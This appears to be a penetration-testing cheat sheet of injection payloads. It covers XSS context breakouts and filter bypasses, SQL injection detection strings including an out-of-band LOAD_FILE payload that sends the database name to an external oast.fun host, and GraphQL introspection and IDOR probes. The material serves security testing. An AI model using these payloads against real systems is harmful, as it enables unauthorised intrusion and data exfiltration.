# Security Expert Knowledge Base: Vulnerability Deep Dive

## XSS (Cross-Site Scripting)

### Context Classification

1. **HTML Text**: `<p>PAYLOAD</p>` -> Use tags: `<img/svg/details/iframe>`.
2. **Attribute Quoted**: `value="PAYLOAD"` -> Break out with `">` or use event handlers: `" onfocus=alert(1) autofocus "`.
3. **Attribute Unquoted**: `value=PAYLOAD` -> Space separation: `x onmouseover=alert(1)`.
4. **JS String**: `var x = 'PAYLOAD';` -> Break out with `';alert(1)//` or use backslash escape `\'` -> `\\'` (if the server escapes quotes).
5. **URL Handler**: `href="PAYLOAD"` -> Use `javascript:alert(1)`.

### Advanced Bypasses

- **SVG/MathML**: Use `<svg onload=...>` or `<math><mtext><mglyph onload=...>` to bypass filters that only look for HTML tags.
- **Mutation XSS (mXSS)**: Use tags that the browser "fixes" in a way that executes code, e.g., `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`.
- **Double Encoding**: `%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E`.

## SQL Injection (SQLi)

### Detection Channels

- **Boolean-based**: `AND 1=1` vs `AND 1=2`. Observe status code/body length diffs.
- **Time-based**: `SLEEP(5)`, `pg_sleep(5)`, `WAITFOR DELAY '0:0:5'`.
- **OAST (Out-of-Band)**: `LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.oast.fun\\a'))`.

### Modern Surfaces

- **JSON Operators**: Injection via `->`, `->>`, `@>` in Postgres/MySQL.
- **ORM Fragments**: `whereRaw`, `orderByRaw`, `findOne({where: "id=" + id})`.

## GraphQL Injection

- **Introspection**: `query { __schema { queryType { name } } }`.
- **Argument Injection**: Injecting SQL/NoSQL payloads into GraphQL arguments.
- **IDOR**: Changing IDs in queries to access other users' data.
